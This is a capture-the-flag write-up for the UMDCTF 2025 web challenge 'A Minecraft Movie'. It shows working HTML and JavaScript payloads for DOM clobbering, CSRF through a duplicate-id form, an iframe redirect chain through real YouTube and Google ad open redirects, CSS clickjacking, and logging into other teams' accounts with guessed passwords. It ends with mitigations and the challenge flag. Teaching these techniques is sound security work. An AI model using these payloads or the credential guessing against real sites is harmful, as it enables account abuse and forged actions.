---
title: A Minecraft Movie
author: tahmid-23
description: I...AM STEVE!
categories:
    - Web
year: 2025
---

# TL;DR<a id="TL;DR"></a>
    **- Challenge Setup:** **React** webapp having account management with simple posts you can create and let it rate by the admin - you get the flag if the admin likes your post
    **- Key Discoveries:** Client side validation with **DOMPurify**
    **- Vulnerability:** HTML injection in the content of posts and the admin makes 1 click
    **- Exploitation:** There were several ways of exploiting the 1 click of the admin to get CSRF from a simple form submit to a clickjacking styled attack to CSS shenanigans to DOM clobbering and finally just cheese the challenge by logging into another teams account

# 1. Introduction<a id="introduction"></a>
Although this challenge was not really hard, I think the coolest about this one was there were so many different ways to solve this challenge.
Most of the solves I will show here are not mine.
I got these ideas from the **UMDCTF** Discord but I really think all of them are worth to be mentioned.

# 2. Reconnaissance<a id="reconnaissance"></a>
We are given two URLs: one for the website itself and one to submit a post ID to the admin (everything else than a post ID will be rejected) - a typical XSS/CSRF challenge setup.
Starting with the challenge we are greeted by a wonderful landing page having several different posts.
Having a look into one of the posts reveals users can add e.g. embedded **YouTube** links via iframes with some more content.
But more important we see a small hint `🌟 This post was liked by an admin!`.
![landing overview](ctf/writeups/umdctf/aminecraftmovie/landingoverview.png "landing overview")
So it is quite obvious we have to make the admin like our post.
Creating our own account we can see following dashboard:
![account overview](ctf/writeups/umdctf/aminecraftmovie/accountoverview.png "account overview")
But there is something weird with the `session number`, it tells us it is `undefined`.
This will be more important later for the `DOM clobbering` exploit.
Creating a new post with some `<b>` HTML tag will reveal we effectively got HTML injection:
![post testing](ctf/writeups/umdctf/aminecraftmovie/posttesting.png "post testing")
Moreover sending any post to the admin reveals, he will always click the dislike button.
Going further and trying some `<script>` tag reveals there is some kind of sanitizer, removing malicious HTML.
But as we look into the response in **Burp Suite** we see the script tag isn't sanitized by some backend:
![xss test](ctf/writeups/umdctf/aminecraftmovie/xsstest.png "xss test")
So there has to be a clientside sanitizer.
Investigating the `index.js` running in our browser we will find **DOMPurify** v3.2.5 a powerful XSS sanitizer running in its latest version.
It is very unlikely we have to find a bypass for this sanitizer so we have to come up with some other ideas.

# 3. Vulnerability Description<a id="vulnerability description"></a>
Liking one of our own posts and coming back to our account dashboard we won't see `Current Session Number: undefined` anymore but now it shows the amount of likes we have given to posts.
Having a closer look at the request made reveals some `legacy` endpoint:
![liking a post](ctf/writeups/umdctf/aminecraftmovie/sessionnumberinlikingpost.png "liking a post")
So the `session number` is always submitted with our POST request to like a post.
As we earlier saw `Current Session Number: undefined`, this is maybe just a `window` property so let's test our assumption.
And indeed as we type in `window.` it will already suggest `window.sessionNumber` which got the same number we see on our dashboard.
Also checking out the HTML of an arbitrary post will hint us with a comment `<!-- TODO: Migrate social endpoint, switch to useState/useContext -->`.
So instead of some native **React** functionality to manage some kind of state, the developers of this website just used a simple `window` property.

# 4. Exploitation<a id="exploitation"></a>
## 4.1. Exploitation Variant 1 - DOM clobbering<a id="exploitation variant 1"></a>
In short DOM clobbering is about changing the way JavaScript works on some website by injecting specific HTML content.
By setting the `id` attribute of some HTML tag to some used `window` property, we can overwrite the content of this global JavaScript object or variable.
In this case `sessionNumber` is a great target.
So by simply using as post content `<a href="&likes=10" id="sessionNumber">gimme like</a>` we will see in the request following:
![dom clobbered session number](ctf/writeups/umdctf/aminecraftmovie/domclobberedsessionnumber.png "dom clobbered session number")
As the `sessionNumber` is simply added into the HTTP request data, we can add a new key-value pair `likes` by simply setting `&` at the start of the `href` attribute, which is used for the request.
The backend will take the first `likes` key-value pair, so although we clicked the dislike button, we still contribute a like to the post.
Sending the post ID to the admin will result in:
![admin liked](ctf/writeups/umdctf/aminecraftmovie/adminliked.png "admin liked")
Returning to our account overview, we are greeted with the flag:
![flag](ctf/writeups/umdctf/aminecraftmovie/flag.png "flag")

## 4.2. Exploitation Variant 2 - Submit form<a id="exploitation variant 2"></a>
The simplest method to get CSRF without any JavaScript but with a click are submit forms.
The only obstacle is the admin will always click the button with the id `dislike-button`.
But what happens if we just add another HTML element with the same id?
Technically this is invalid HTML.
But as browsers always do something with invalid HTML, it is still being rendered.
However DOM access via for example `window.document.getElementById('dislike-button')` will return the first element in the DOM with this specific id.
This is just an assumption but probability is high that the admin is implemented with selenium/puppeteer to automate admin requests.
As the challenge just simulates a click on the button with id `dislike-button` it will search the DOM and will receive the first one which is ours.
So if we just add a random post and a second one like following:
```html
<form action="https://a-minecraft-movie-api.challs.umdctf.io/legacy-social"
    method="post">
    <input type="hidden" name="postId" value="<post-id-from-any-other-post>">
    <input type="hidden" name="likes" value="1">
    <button id="dislike-button" type="submit">Get this juice like</button>
</form>
```
the admin will click our submit form and thus like our other post.

## 4.3. Exploitation Variant 3 - iframe youtube redirect<a id="exploitation variant 3"></a>
There was another great idea to solve this challenge.
As you basically have HTML injection, we can try to redirect the admin to our website.
As the webserver got no CSRF protection we can just simply host an automatic submit form, so the admin will like our post.
Starting with the redirect we have a little problem:
```javascript
const dirtyHTML = f.content;
const cleanHTML = DOMPurify.sanitize(dirtyHTML, {
  ADD_TAGS: ["iframe"],
  ADD_ATTR: ["allow", "allowfullscreen", "frameborder", "scrolling", "src", "width", "height"]
});

...

DOMPurify.addHook("uponSanitizeElement", (node, data) => {
  if (data.tagName === "iframe" && node instanceof Element) {
    const src = node.getAttribute("src") || "";
    if (!src.startsWith("https://www.youtube.com/embed/")) {
      node.parentNode.removeChild(node);
    }
  }
});
```
We are allowed to embed content in iframes, but only from **YouTube**.
So we need an open redirect.
The first one is in **YouTube** itself, but it is a bit restricted as it only allows you to redirect to **Google** domains with `https://www.youtube.com/embed/../logout?continue=https://google.com`.
The second open redirect is in the **Googleads** product and thus allows us to do a double open redirect like following:
```html
<iframe src="https://www.youtube.com/embed/../logout?continue=https://googleads.g.doubleclick.net/pcs/click?adurl=<your-own-website>"></iframe>
```
Now we can host following HTML with an appropriate post ID on our website, which leads to CSRF liking our post:
```html
<script>
fetch('https://a-minecraft-movie-api.challs.umdctf.io/legacy-social', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: 'sessionNumber=1&postId=<post-id>&likes=1',
  credentials: 'include'
});
</script>
```
The iframe will be victim to the open redirects.
The reason for this is the cookie attribute `sameSite=none`, you can read further [this article](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#none).
This basically means, the browser will always send the cookie to the minecraft website in all requests, no matter by whom they were issued.
So when the iframe is redirected to our malicious website, the POST request will be submitted together with the admin cookie.
The cool thing about this exploit is we don't even need the click of the admin.

## 4.4. Exploitation Variant 4 - CSS shennanigans<a id="exploitation variant 4"></a>
This one is a bit more special, but I really like the idea.
It is basically a click-jacking like approach to solve this challenge.
The main idea is to add another button with the id `dislike-button`, just like in the submit-form-approach.
But this time we will move our button behind the like button.
The admin bot will just search for this button via the id attribute and then click on the element.
You might think at first, puppeteer will click the element even when it is overlapped by another element.
But reading the documentation about puppeteer [click handler](https://pptr.dev/api/puppeteer.elementhandle.click), we will get the information it really simulates a real mouse click.
So it will focus the element given by a selector for example the element with the id `dislike-button` but will still click the most upper element.
By adding a post with following content:
```html
<div id="dislike-button" style="position:absolute;transform:translateX(305px) translateY(17px);z-index:-1;">I love CSS</div>
```
the button will be perfectly covered by the like button.
Submitting this to the admin will lead in a like for our post.

## 4.5. Exploitation Variant 5 - I…LIKE CHEESE!🧀<a id="exploitation variant 5"></a>
This is one of the oldest cheeses in CTF and also really applies in the real world.
In general if you have a weak password policy enforcement, people will use bad username-password combinations.
Especially if time is a factor like in CTF challenges.
So you can expect some bad credentials and try to guess them like for example `asdfasdf:asdfasdf` and you basically get the flag without even exploiting the actual challenge.

# 5. Mitigation<a id="mitigation"></a>
Although **DOMPurify** was present on this website some mistakes were made.
Giving users effectively HTML injection always opens doors for attackers.
If you really want your users to style their content, then just use a markdown parser or something similar.
Moreover allowing **YouTube** links to be embedded obviously opens the door for open redirects as we already saw.
There is no reason for `sameSite=none`, especially if users can add iframes this is a very bad idea.
Instead use the default value `Lax` or even `Strict`.
Also the use of global JavaScript objects like `window.sessionNumber` is a very bad idea when requests are depending on it.
Instead use as the TODO already hints native functionality in **React** like `useState` or `useContext`.
Another mistake was to set up the challenge with a shared instance.
This is not in general a bad idea but together with a weak password policy and having the flag just right there in the dashboard of the accounts will always lead to lazy players logging into others accounts and stealing their flags.
All over having another user giving you one click on your own post is very powerful and should always remind us to really think about clicking on unknown websites.

# 6. Flag<a id="flag"></a>
UMDCTF{I_y3@RNeD_f0R_7HE_Min3S}
